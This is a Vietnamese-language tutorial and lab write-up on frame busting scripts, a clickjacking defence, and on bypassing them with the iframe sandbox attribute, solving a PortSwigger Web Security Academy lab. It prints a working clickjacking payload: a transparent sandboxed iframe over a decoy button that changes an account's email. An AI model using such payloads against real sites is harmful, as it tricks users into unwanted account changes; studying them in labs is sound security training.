# Frame busting scripts

**Frame busting scripts** là một kỹ thuật được sử dụng để ngăn chặn các cuộc tấn công clickjacking bằng cách hạn chế khả năng nhúng (framing) các trang web vào iframe. Dưới đây là giải thích chi tiết:

**Cách hoạt động của Frame Busting Scripts**:

1. **Bảo vệ phía trình duyệt**:

- Frame busting scripts thường được triển khai trên phía trình duyệt thông qua JavaScript hoặc các tiện ích mở rộng (extensions) như **NoScript**.

- Chúng được thiết kế để ngăn chặn các cuộc tấn công clickjacking bằng cách thực hiện một hoặc nhiều hành động sau:

    - Kiểm tra và đảm bảo cửa sổ ứng dụng hiện tại là cửa sổ **top-level** (không nằm trong iframe).

    - Hiển thị tất cả các iframe để người dùng có thể nhìn thấy nội dung của chúng.

    - Ngăn người dùng click vào các iframe ẩn hoặc trong suốt.

    - Phát hiện và cảnh báo người dùng về các cuộc tấn công clickjacking tiềm ẩn.

**Hạn chế của Frame Busting Scripts**:

1. **Phụ thuộc vào trình duyệt và nền tảng**

- Các kỹ thuật frame busting thường **cụ thể cho từng trình duyệt và nền tảng**, nên không đảm bảo hoạt động nhất quán trên mọi môi trường.

2. **Dễ bị bypass**

- HTML rất linh hoạt, cho phép kẻ tấn công tìm cách **vượt qua các frame busters** bằng nhiều phương pháp khác nhau.

3. **Hạn chế JavaScript**

- Vì frame busting scripts sử dụng JavaScript, chúng có thể không hoạt động nếu:

    - **Cài đặt bảo mật trình duyệt** chặn JavaScript.

    - Trình duyệt không hỗ trợ JavaScript.

**Kỹ thuật bypass Frame Busting**

Một trong những cách kẻ tấn công sử dụng để bypass frame busting là khai thác thuộc tính **sandbox** của iframe trong HTML5.

1. **Cách thức hoạt động**

- Kẻ tấn công sử dụng thuộc tính **sandbox** trong iframe để **vô hiệu hóa khả năng kiểm tra top-level window** của frame busting scripts.

- Ví dụ: 

        <iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>

2. **Giải thích**

- Thuộc tính **sandbox** với các giá trị như **allow-forms** hoặc **allow-scripts** cho phép các hành động nhất định diễn ra trong iframe (ví dụ: gửi form, chạy script).

- Tuy nhiên, khi **không có giá trị allow-top-navigation**, iframe **không thể kiểm tra** liệu nó có phải là cửa sổ top-level hay không.

- Điều này **vô hiệu hóa** các hành vi của frame busting scripts nhưng vẫn cho phép hoạt động trong iframe.

**Tóm lại:**

Frame busting scripts là một biện pháp bảo vệ chống clickjacking nhưng có những hạn chế rõ ràng. Kẻ tấn công có thể vượt qua chúng bằng các kỹ thuật như sử dụng thuộc tính **sandbox** trong HTML5 để ngăn iframe kiểm tra top-level navigation, từ đó thực hiện các cuộc tấn công clickjacking hiệu quả.

# Lab: Clickjacking with a frame buster script
![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image14.png?raw=true)

### Web page
![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image15.png?raw=true)

### Solution

Login vào account được cấp wiener:peter:

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image16.png?raw=true)

Tiếp tục sử dụng lại payload: 

        <style>
                iframe {
                    position:relative;
                    width:700px;
                    height:500px;
                    opacity: 0.1;
                    z-index: 2;
                }
                div {
                    position:absolute;
                    top:445px;
                    left: 80px;
                    z-index: 1;
                }
        </style>
        <div>Click me</div>
        <iframe src="https://0a3e00b3040bb1f9814b61ec001800c3.web-security-academy.net/my-account?email=wiener1@test1.com" sandbox="allow-forms"></iframe>

Trong payload lần này thêm thuộc tính sandbox="allow-forms" để bypass frame buster script.

GO to exploit server và copy payload vào phần body: 

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image17.png?raw=true)

Store và Deliver exploit to victim.

Solved the lab!

![img](https://github.com/DucThinh47/PortSwigger/blob/main/Clickjacking(UI_redressing)/images/image18.png?raw=true)













